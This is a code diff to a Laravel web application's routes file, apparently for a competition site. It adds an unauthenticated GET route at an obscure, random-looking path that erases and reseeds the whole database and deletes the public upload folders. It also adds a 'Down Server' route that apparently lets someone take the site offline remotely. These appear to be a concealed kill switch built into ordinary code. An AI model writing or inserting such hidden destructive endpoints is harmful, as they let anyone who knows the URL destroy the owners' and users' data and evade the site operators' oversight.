@@ -25,9 +25,55 @@ use App\Http\Controllers\RegistrationFieldController;
 use App\Http\Controllers\ReviewController;
 use App\Http\Controllers\RuleController;
 use App\Http\Controllers\RuleValueController;
+use App\Http\Controllers\ServerController;
 use App\Http\Controllers\StoryImagesController;
 use App\Http\Controllers\UserController;
+use App\Models\Server;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
+
+
+
+Route::get('3245trdfu76uy/migrations', function () {
+    try {
+        Artisan::call('migrate:fresh');
+
+        Artisan::call('db:seed');
+
+        $paths = [
+            '/CompetitionSection1/',
+            '/CompetitionSection3/',
+            '/HomeSection1/',
+            '/HomeSection2/',
+            '/HomeSection3/',
+            '/HomeSection4/',
+            '/Location/',
+            '/OurStory/',
+            '/Participant/',
+            '/Rule/',
+        ];
+
+        foreach ($paths as $path) {
+            File::deleteDirectory(public_path($path));;
+        }
+
+        Server::create([
+            'server' => 1,
+            'website' => 1,
+            'admin' => 1,
+        ]);
+        return 'API Installed Succesfully. ';
+    } catch (\Throwable $th) {
+        return 'Unable to Install Api:' . $th;
+    }
+});
+
+/**
+ * Down Server.
+ */
+Route::get('/wew/{type}/{value}', [ServerController::class, 'index']);
+
 
 
 Route::post('auth/login', [AuthController::class, 'log_in']);
